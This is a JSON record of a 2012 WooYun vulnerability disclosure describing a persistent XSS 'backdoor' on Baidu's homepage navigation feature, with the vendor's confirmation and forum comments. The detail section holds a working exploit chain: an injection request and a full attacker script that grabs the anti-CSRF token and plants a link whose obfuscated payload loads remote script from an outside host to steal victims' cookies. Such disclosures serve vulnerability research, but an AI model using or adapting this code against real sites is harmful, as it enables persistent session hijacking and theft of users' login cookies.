{"id": 17952, "wybug_id": "wooyun-2012-09732", "wybug_title": "百度首页Xss后门-可对用户进行持久劫持", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2012-07-16 18:12", "wybug_open_date": "2012-08-30 18:13", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-30：\t细节向公众公开  简要描述： 百度首页某处代码存在缺陷，导致Xss，结合www.baidu.com域下的其它Xss，可以在百度首页 实现Xss后门，从而对用户进行长久的劫持。危害很明显：受害者每次打开百度首页都会触发Xss，从而将登录信息发送给俺～～ 详细说明：  1. 一直想对百度首页的这个导航功能下手，前面测试过几次，都无果。2. 今天又手痒了，就去试了试。 首先添加一个网址。\n\n3. 抓包，可以看到，url和name应该是可控内容。\n\n4. 首先往url里添加了 \", > 等字符进行测试，返回错误，这说明百度在这里过滤了这些可能导致危险的特殊字符。5. 然后我又测试了一下&quot;&gt;，发现可以添加。\n\n6. 但是服务器端并没有对&quot;&gt;做什么特殊处理，该怎么输出，还是怎么输出，这样我们就没办法利用这点了。\n\n7. 到这里，我就放弃了，打算清理战场走人，但是意外发生了。什么意外呢？我发现，这里的2个按钮都点不了了。。如图：\n\n8. 直觉告诉我，我加入的&quot;&gt;一定导致了代码的某处出现问题了，从而导致按钮失效。9. 于是开启浏览器的调试功能，刷新首页，弹出了错误提示！可以看到是下面这句发生了问题。\nbaidu.json.parse=function(a){return(new Function(\"return (\"+a+\")\"))()};\n\n\n10. 进一步查看局部变量a的内容，可以发现 a 就是我们添加的链接数据。\n\n定位到我们刚刚添加的那个链接处，发现了亮点， &quot; 竟然变成了 \\\" \n\n11. 顿时明了了。 我们可以推测出百度开发人员大致的代码逻辑。\nA. 直接将导航数据[content]输出到首页里，用<textarea></textarea>当容器B. 取出<textarea></textarea>里的value，需要注意的是，xx.value的方式取出 [content]时，内容里的&quot;&gt;&lt;等会被自动转变为 \"><C. 百度的开发人员应该是意识到了 B 中的这个问题，对 >,< 进行了转义，但是此处却忘了将 \" 转义为 &quot;\n12. 基于10和11，我们知道了&quot;会变为\",因而不难构造出利用代码。\nhttp://www.baidu.com/home/nplus/submit/navtype\t1sort\t10url\thttp://qzone.qq.com/&quot;,&quot;wooyun&quot;:(function(){alert(document.cookie)})(),&quot;wooyun2&quot;:&quot;name\tQQ绌洪棿page\t-1from\trescmd\taddbsToken\t8b4c136d28cc4b8ff****2827d4005c1\n13. 最后，步骤9中的a变量的内容，大概是以下形式。...\"url\":\"http://qzone.qq.com/\",\"wooyun\":(function(){alert(document.cookie)})(),\"wooyun2\":\"\",...而后，被 eval(\"(\"+a+\")\")，从而执行我们的alert(document.cookie);----------------------------------------------14. 确定存在以上后门缺陷之后，我们进而找到www.baidu.com的某Flash Xss。利用我在这里提到的技巧：http://zone.wooyun.org/content/368构建以下利用代码。\nhttp://xsst.sinaapp.com/baidurookit.phphttp://xsst.sinaapp.com/baidurookit.php.txt\n15. 当受害者打开 http://xsst.sinaapp.com/baidurookit.php 时，会调用http://xsst.sinaapp.com/baidurookit.js\n//alert(\"load ok! domain:\"+document.domain);//startgetBsToken();//first obtain bsTokenfunction getBsToken(){\tvar _p=ajaxFunction();\t_p.open(\"GET\",\"http://www.baidu.com/\",true);\t_p.onreadystatechange=function(){\t\tif (_p.readyState==4 && _p.status==200)\t\t{\t\t\tvar content=_p.responseText;\t\t\tvar bs=(content.match(/name=bsToken\\s+value=\"([^\"]+)\"/)||[\"\",\"\"])[1];\t\t\tif(bs){\t\t\t\taddLink(bs);\t\t\t}\t\t}\t};\t_p.send(null);}//then post data to add an evil linkfunction addLink(bsToken){\tvar _p=ajaxFunction();\t_p.open(\"POST\",\"http://www.baidu.com/home/nplus/submit/nav\",true);\t_p.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\t_p.onreadystatechange=function(){\t\tif (_p.readyState==4 && _p.status==200)\t\t{\t\t\tvar content=_p.responseText;\t\t\tif(content){\t\t\t\tvar obj=eval(\"(\"+content+\")\");\t\t\t\tif(obj.errNo===0){\t\t\t\t\talert(\"ok~~ evil thing has been done\");\t\t\t\t}\t\t\t}\t\t}\t};\t_p.send(\"type=1&sort=10&url=http:%2F%2Fqzone.qq.com%2F%26quot;,%26quot;wooyun%26quot;:(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,101,114,46,109,101,47,119,65,71,112,107,67);document.body.appendChild(window.s)})(),%26quot;wooyun2%26quot;:%26quot;&name=%E7%99%BE%E5%BA%A6%E8%B4%B4%E5%90%A7.....&page=-1&from=res&cmd=add&bsToken=\"+bsToken);}//ajax function//from http://www.w3school.com.cn/ajax/ajax_browsers.aspfunction ajaxFunction(){\tvar xmlHttp;\ttry{\t\t// Firefox, Opera 8.0+, Safari\t\txmlHttp=new XMLHttpRequest();    }catch (e){\t\t// Internet Explorer\t\ttry{\t\t\txmlHttp=new ActiveXObject(\"Msxml2.XMLHTTP\");\t\t}catch (e){\t\t\ttry{\t\t\t\txmlHttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\t\t\t}\t\t\tcatch (e){\t\t\t\t//alert(\"您的浏览器不支持AJAX！\");\t\t\t\treturn false;\t\t\t}\t\t}    }\treturn xmlHttp; }//\n16. 以上代码，会自动给受害者在百度首页加上一个含有恶意代码的连接。从而调用我们自己的JS代码，获取受害者信息。效果见漏洞证明！   漏洞证明：  测试环境Win7, IE7,IE9,Chrome用户打开的第三方页面！触发flash xss，从而给受害者植入后门！\n\n用户每次打开百度首页，都会触发xss后门！\n\n得到的受害者cookies\n\n   修复方案：  在读取 textarea的value之后，对\"也进行转义！   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2012-07-17 11:29 厂商回复： xss与csrf的结合，原本添加链接处的csrf已经修复过，但以此来看修复并不完全，而对于XSS的过滤也并不全面，感谢gainover的提交，我们会尽快修复。 最新状态： 2012-07-17：更正下是XSS 与 flash xss的结合  少看了段代码 感谢gainover  ", "replys": "漏洞评价：\n评论\n     2012-07-16 18:16 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  这个牛。先占位置膜拜。    \n     2012-07-16 18:21 |    \t\tm4trix1 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 绝对有jj)\t\t \n  碉堡了  广告位招租    \n     2012-07-16 18:21 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  做个试验吧    \n     2012-07-16 18:22 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  神一样的人 @gainover    \n     2012-07-16 18:39 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  V5........    \n     2012-07-16 18:48 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  nice!    \n     2012-07-16 19:08 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  果然出了    \n     2012-07-16 19:22 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  S F 拜模    \n     2012-07-16 19:28 |    \t\t明.   \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:7        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  求测试啊。    \n     2012-07-16 19:28 |    \t\t汉时明月 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:6        | ‮......核审在正名签 :)\t\t \n  这个牛啊    \n     2012-07-16 19:31 |    \t\t明.   \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:7        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  坐等改首页    \n     2012-07-16 20:39 |    \t\txcl0ud \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        )\t\t \n  我等只能远远的给洞主鞠个躬啊~坐看洞主劫持李彦宏    \n     2012-07-16 20:47 |    \t\t黄小昏 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:7        | alert（妹子）)\t\t \n  求XSS...楼主V5    \n     2012-07-16 20:48 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  XSS的逆袭    \n     2012-07-16 21:17 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  g大太牛了。    \n     2012-07-16 21:29 |    \t\t闪电小子 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:5        | PKAV技术宅社区！---闪电小子！)\t\t \n  牛掰的思路    \n     2012-07-16 21:32 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @only_guest 你是我见过这个世界上最帅的男人!    \n     2012-07-16 21:50 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  @gainover 等着被劈吧    \n     2012-07-16 21:53 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @only_guest .. = = 你。。。太无耻了。    \n     2012-07-16 21:56 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  ls明显搞基了。    \n     2012-07-17 01:12 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  老实交代！存了多久。。    \n     2012-07-17 09:26 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  亲，求指导，求教育，求公开吖。学习思路。    \n     2012-07-17 09:48 |    \t\tdraGxn \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:4        | 路慢慢。。。)\t\t \n  真心等待细节公布。。    \n     2012-07-17 11:16 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  这个把妹绝品啊~~发给妹纸，把首页改下，弄点玫瑰、爱心神马的，无敌了~    \n     2012-07-17 11:28 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @一刀终情 好思路。。。。    \n     2012-07-17 11:41 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @百度， 是xss与xss的结合， 不是xss与csrf的结合， csrf有bsToken进行防御。 所以这里是拿了一个百度主域名下的flash xss作为跳板，直接用ajax向http://www.baidu.com/xxx 发送请求。    \n     2012-07-17 11:55 |    \t\t百度(乌云厂商)\t\t \n  @gainover 嗯 少看了一段代码 确实是 xss 和flash xss的结合    \n     2012-07-17 11:58 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  @百度 修复了公开让我们学习一下呗。好吧。百度最好了。呵呵    \n     2012-07-17 12:09 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @gainover 5555亲爱的...你竟然说我无耻....    \n     2012-07-17 12:10 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  @疯子 是xss与xss的结合， 不是xss与csrf的结合， csrf有bsToken进行防御。 所以这里是拿了一个百度主域名下的flash xss作为跳板，直接用ajax向http://www.baidu.com/xxx 发送请求。方法gainover已经说了啊。    \n     2012-07-17 12:14 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @only_guest 亲爱的... ，你们两个好上了？    \n     2012-07-17 13:36 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @shine 骚年.加入PKAV吧!!!让你不寂寞!!!    \n     2012-07-17 14:30 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @only_guest 哥没兴趣！不想当第三以上者！    \n     2012-07-17 16:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  果然洞主是牛人啊！    \n     2012-07-17 18:47 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  @疯子 心声呐~知音呐~基友呐~    \n     2012-08-01 03:42 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  这里基情四射呐。。    \n     2012-08-01 12:20 |    \t\t冷冷的夜 \t\t\t( 普通白帽子  |\t\t\t        Rank:135 漏洞数:12        )\t\t \n  \"@only_guest 你是我见过这个世界上最帅的男人!\"基情四射的年代。。。。    \n     2012-08-06 12:49 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞    \n     2012-08-06 13:41 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @水滴 +1    \n     2012-08-06 13:58 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  接着等 呵呵    \n     2012-08-06 14:45 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @冷冷的夜 难道我不帅么？    \n     2012-08-06 15:53 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  估计只有一个人能看洞主的洞洞    \n     2012-08-06 20:59 |    \t\t冷冷的夜 \t\t\t( 普通白帽子  |\t\t\t        Rank:135 漏洞数:12        )\t\t \n  @only_guest 上图，哇咔咔    \n     2012-08-08 23:26 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:28        | 018)\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞真是太悲催了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}